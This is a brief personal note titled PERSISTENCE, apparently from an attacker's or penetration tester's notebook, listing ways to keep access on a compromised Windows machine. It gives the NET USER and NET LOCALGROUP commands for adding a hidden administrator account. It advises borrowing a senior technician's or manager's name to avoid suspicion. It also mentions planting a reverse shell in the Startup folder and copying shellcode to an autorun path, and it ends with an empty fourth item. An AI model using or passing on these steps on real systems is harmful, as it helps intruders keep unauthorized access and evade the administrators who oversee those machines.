---
title: PERSISTENCE
updated: 2023-11-03 08:50:41Z
created: 2023-11-03 08:42:49Z
latitude: -33.86881970
longitude: 151.20929550
altitude: 0.0000
---

1. **Add users** , Add user to **Administrators** group. Try to use names of a senioer technician or manager to reduce suspicion.
`NET USER <username> <password> /ADD`
`NET LOCALGROUP Administrators <username> /ADD`
2. Add reverse shellcode to the **Windows Startup folder**
3. PersistAutoun , add **shellcode.exe** file to **c:\Users\Public\autorun.exe**
4. 